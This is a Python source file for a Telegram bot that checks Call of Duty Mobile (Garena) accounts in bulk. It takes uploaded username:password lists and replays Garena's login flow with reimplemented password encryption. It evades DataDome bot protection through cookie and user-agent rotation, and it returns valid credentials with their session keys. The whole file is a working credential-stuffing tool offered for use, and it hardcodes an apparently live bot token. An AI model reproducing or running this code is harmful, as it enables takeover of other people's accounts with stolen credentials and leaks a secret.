import os
import re
import time
import json
import random
import threading
import requests
import tempfile
import shutil
from datetime import datetime
from flask import Flask
from threading import Thread
from telegram.ext import Application, CommandHandler, MessageHandler, filters

# ============================================================
# FLASK WEB SERVER (para sa UptimeRobot)
# ============================================================
web_app = Flask('')

@web_app.route('/')
def home():
    return "✅ CODM Checker Bot is alive!"

@web_app.route('/health')
def health():
    return "OK", 200

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_web)
    t.daemon = True
    t.start()

# ============================================================
# BOT CONFIG
# ============================================================
TOKEN = "8575832085:AAEYCs_Qoj8CGIHqwvCENveCgovFRNxA1pY"

# ============================================================
# CODM CHECKER FUNCTIONS (from your tool)
# ============================================================

# Datadome pool
_datadome_pool = [
    "RKe_J3wzPjVZzeWoOdjnxN9LddQHH9aFLa0Mf21u7D2VhV5Igyiswg4_fFRrA3yImr7T6qsdJEB50dO8kniUBYWzBQsq4bG1l981Q3u4CCwcr2LPIl~JxgrDq_TNeNgD",
]

class DataDomeCookieRotator:
    def __init__(self, pool):
        self.lock = threading.Lock()
        self.pool = list(pool)
        self.index = 0

    def get(self):
        with self.lock:
            if not self.pool:
                raise ValueError("Cookie pool is empty")
            cookie = self.pool[self.index]
            return {"datadome": cookie}

    def advance(self, steps=1):
        with self.lock:
            self.index = (self.index + steps) % len(self.pool)

_rotator = DataDomeCookieRotator(_datadome_pool)

def get_cookie():
    return _rotator.get()

def advance_cookie(skip=1):
    _rotator.advance(skip)

# ============================================================
# CORE CHECK FUNCTIONS
# ============================================================

apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "sec-ch-ua-platform": '"Windows"',
        "Accept": "application/json, text/plain, */*",
    }

def generate_md5_hash(password):
    import hashlib
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    import hashlib
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    from Crypto.Cipher import AES
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]

def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    encrypted_password = encrypt_aes_256_ecb(password_md5, decryption_key)
    return encrypted_password

def check_account(username, password):
    """Check a single CODM account"""
    try:
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))
        
        cookies = get_cookie()
        headers = get_headers()
        
        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }
        
        login_url = "https://auth.garena.com/api/prelogin"
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return None, f"HTTP {response.status_code}"
            
        data = response.json()
        v1 = data.get('v1')
        v2 = data.get('v2')
        prelogin_id = data.get('id')
        
        if not all([v1, v2, prelogin_id]):
            return None, "Account doesn't exist"
            
        encrypted_password = getpass(password, v1, v2)
        new_datadome = response.cookies.get('datadome')
        
        # Perform login
        login_params = {
            'app_id': '100082',
            'account': username,
            'password': encrypted_password,
            'redirect_uri': redrov,
            'format': 'json',
            'id': prelogin_id,
        }
        
        login_url = apkrov + f"{requests.compat.urlencode(login_params)}"
        login_response = requests.get(login_url, headers=headers, cookies=cookies, timeout=30)
        
        if "captcha" in login_response.text.lower():
            return None, "CAPTCHA detected"
            
        try:
            login_json = login_response.json()
        except:
            return None, "Invalid response"
            
        if 'error_auth' in login_json or 'error' in login_json:
            return None, "Incorrect password"
            
        session_key = login_json.get('session_key')
        if not session_key:
            return None, "No session key"
            
        # Get account info
        sso_key = login_response.headers.get('Set-Cookie', '').split('=')[1].split(';')[0] if '=' in login_response.headers.get('Set-Cookie', '') else ''
        
        # Get CODM level
        codm_info = show_level(session_key, headers, cookies)
        
        return {
            "username": username,
            "password": password,
            "session_key": session_key,
            "sso_key": sso_key,
            "codm_info": codm_info
        }, None
        
    except Exception as e:
        return None, str(e)

def show_level(session_key, headers, cookies):
    """Get CODM level from session"""
    try:
        url = "https://auth.codm.garena.com/auth/auth/callback_n"
        params = {
            "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
            "session_key": session_key
        }
        
        response = requests.get(url, headers=headers, cookies=cookies, params=params, timeout=30)
        
        # Try to extract level from response
        level_match = re.search(r'level["\']?\s*[:=]\s*["\']?(\d+)', response.text, re.I)
        if level_match:
            return f"Level: {level_match.group(1)}"
            
        nickname_match = re.search(r'nickname["\']?\s*[:=]\s*["\']?([^"\'}\s]+)', response.text, re.I)
        if nickname_match:
            return f"Nickname: {nickname_match.group(1)}"
            
        return "Account valid (no CODM data)"
    except:
        return "Account valid (no CODM data)"

def process_accounts_file(file_content):
    """Process uploaded file with accounts"""
    results = []
    lines = file_content.decode('utf-8', errors='ignore').splitlines()
    
    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
            
        parts = line.split(':')
        if len(parts) >= 2:
            username = parts[-2]
            password = parts[-1]
            
            info, error = check_account(username, password)
            if info:
                results.append(f"✅ {username}:{password} | {info.get('codm_info', 'Valid')}")
            else:
                results.append(f"❌ {username}:{password} | {error or 'Failed'}")
                
    return results

# ============================================================
# TELEGRAM BOT HANDLERS
# ============================================================

async def start(update, context):
    await update.message.reply_text(
        "🎮 *CODM Account Checker Bot*\n\n"
        "Send me a `.txt` file with accounts in this format:\n"
        "`username:password`\n\n"
        "I will check each account and return results.\n\n"
        "Commands:\n"
        "/start - Show this menu\n"
        "/help - More info\n"
        "/status - Bot status",
        parse_mode="Markdown"
    )

async def help_command(update, context):
    await update.message.reply_text(
        "📖 *How to use:*\n\n"
        "1. Prepare a `.txt` file with accounts:\n"
        "   `user1:pass1`\n"
        "   `user2:pass2`\n\n"
        "2. Send the file to this bot.\n\n"
        "3. Wait for results (may take a few seconds per account).\n\n"
        "⚠️ *Note:* Free tier has limits. For large lists, split into multiple files.",
        parse_mode="Markdown"
    )

async def status_command(update, context):
    await update.message.reply_text(
        "🟢 *Bot Status:* Online\n"
        "⚡ *Uptime:* 24/7 (with UptimeRobot)\n"
        "🔐 *Security:* DataDome bypass enabled",
        parse_mode="Markdown"
    )

async def handle_document(update, context):
    """Handle uploaded .txt file"""
    try:
        document = update.message.document
        file_name = document.file_name
        
        if not file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please send a `.txt` file.")
            return
            
        # Download file
        file_obj = await context.bot.get_file(document.file_id)
        file_bytes = await file_obj.download_as_bytearray()
        
        await update.message.reply_text("📥 File received! Processing accounts...")
        
        # Process accounts
        results = process_accounts_file(bytes(file_bytes))
        
        if not results:
            await update.message.reply_text("❌ No valid accounts found in the file.")
            return
            
        # Prepare response
        response = "📊 *Results:*\n\n"
        response += "\n".join(results[:20])  # Limit to 20 lines
        
        if len(results) > 20:
            response += f"\n\n... and {len(results) - 20} more accounts."
            
        response += f"\n\n✅ Total checked: {len(results)}"
        
        # Split if too long
        if len(response) > 4000:
            await update.message.reply_text("Results too long, saving to file...")
            
            # Save to temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write("\n".join(results))
                temp_path = f.name
                
            # Send as document
            with open(temp_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    caption=f"📊 Results: {len(results)} accounts checked"
                )
            os.unlink(temp_path)
        else:
            await update.message.reply_text(response, parse_mode="Markdown")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")

# ============================================================
# MAIN
# ============================================================

print("🤖 CODM Checker Bot is starting...")
print(f"Bot Token: {TOKEN[:10]}...")

# Start Flask server
keep_alive()
print("✅ Web server started on port 8080")

# Start Telegram bot
app = Application.builder().token(TOKEN).build()

# Add handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("status", status_command))
app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

print("✅ Bot is running!")
app.run_polling(allowed_updates=["message", "callback_query"])